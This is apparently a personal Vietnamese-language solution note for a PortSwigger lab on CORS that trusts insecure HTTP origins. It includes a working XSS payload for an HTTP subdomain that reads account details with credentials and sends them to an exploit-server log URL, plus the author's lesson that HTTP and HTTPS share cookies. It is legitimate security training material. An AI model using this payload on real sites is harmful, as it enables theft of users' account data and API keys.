![[cors-insecure.png]]
-mô tả lab: site chính https nhưng lại trust `http://subdomain`. Mình chiếm subdomain http (có XSS) rồi đọc dữ liệu https.

> [!NOTE]
> -link lab: https://portswigger.net/web-security/cors/lab-trusted-insecure-protocols

### hướng giải
- [ ] mình thử `Origin: https://evil.com` thì fail, thử `Origin: http://LAB-ID.web-security-academy.net` thì được reflect
- [ ] => server trust http. Mà lab cho 1 subdomain http có XSS (`http://stock.LAB.../?productId=<script>...`). Nên mình chèn JS vào subdomain http, lúc đó origin là http hợp lệ nên đọc được dữ liệu https

### giải
-bước 1: mình tìm chỗ XSS ở `http://stock.LAB-ID.web-security-academy.net/?productId=...`, chèn:
```js
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('GET', 'https://LAB-ID.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.send();
function reqListener() {
  location = 'https://exploit-LAB.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
}
</script>
```
![[cors-insecure-xss.png]]
-sau khi quan sát gói tin này, mình thấy request đi từ origin `http://stock...` nên server reflect cho qua, cookie https vẫn được gửi theo (cookie không Secure). API key về log.

-bước 2: lấy key submit là solve.

> [!NOTE]
> -bài học của mình: http và https là 2 origin khác nhau nhưng cookie dùng chung được. Trust http = tự mở cửa cho XSS subdomain.
